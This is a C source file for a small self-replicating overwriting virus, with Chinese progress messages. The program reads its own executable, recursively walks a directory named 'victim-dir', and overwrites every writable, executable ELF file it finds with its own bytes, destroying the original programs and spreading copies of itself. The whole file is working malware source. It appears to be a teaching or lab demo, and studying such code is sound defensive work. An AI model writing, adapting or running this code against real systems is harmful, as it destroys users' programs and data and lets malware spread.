//
// Created by cmtheit on 23-7-2.
//

#include <stdio.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdbool.h>
#include <elf.h>

int is_elf(const char * fn) {
    char buf[4];
    FILE * f = fopen(fn, "r");
    printf("判断文件 %s 是否为 elf\n", fn);
    if (f) {
        fread(buf, 1, 4, f);
        fclose(f);
#define BUF_EQ(n) (buf[n] == ELFMAG##n)
        if (BUF_EQ(0) && BUF_EQ(1) && BUF_EQ(2) && BUF_EQ(3)) {
            return true;
        }
    }
    return false;
}

void inject(const char * fn, const char * self, size_t size) {
    printf("重写 %s\n", fn);
    FILE * f = fopen(fn, "w");
    if (f) {
        fwrite(self, 1, size, f);
        fclose(f);
    }
}

void rewrite(const char * dr, const char * self, size_t size) {
    DIR * d = opendir(dr);
    if (!d) return;
    if (chdir(dr)) {
        closedir(d);
        return;
    }
    struct dirent * dirent = readdir(d);
    struct stat st;
    for (; dirent; dirent = readdir(d)) {
        printf("扫描文件：%s\n", dirent->d_name);
        if (!strcmp(dirent->d_name, ".") || !strcmp(dirent->d_name, "..")) continue;
        lstat(dirent->d_name, &st);
        if (S_ISDIR(st.st_mode)) {
            rewrite(dirent->d_name, self, size);
        } else if (!access(dirent->d_name, R_OK | W_OK | X_OK) && is_elf(dirent->d_name)) {
            inject(dirent->d_name, self, size);
        } else {
            printf("跳过文件 %s \n", dirent->d_name);
        }
    }
    chdir("..");
}

int main(int argc, const char *argv[]) {
    const char * self_fn = argv[0];
    FILE * self_file = fopen(self_fn, "r");
    if (self_file) {
        fseek(self_file, 0, SEEK_END);
        size_t len = ftell(self_file);
        char * buf = malloc(len);
        fseek(self_file, 0, SEEK_SET);
        fread(buf, 1, len, self_file);
        fclose(self_file);
        printf("读取完毕，文件大小为 %zu，发动攻击\n", len);
        rewrite("victim-dir", buf, len);
    }
    printf("virus run.\n");
}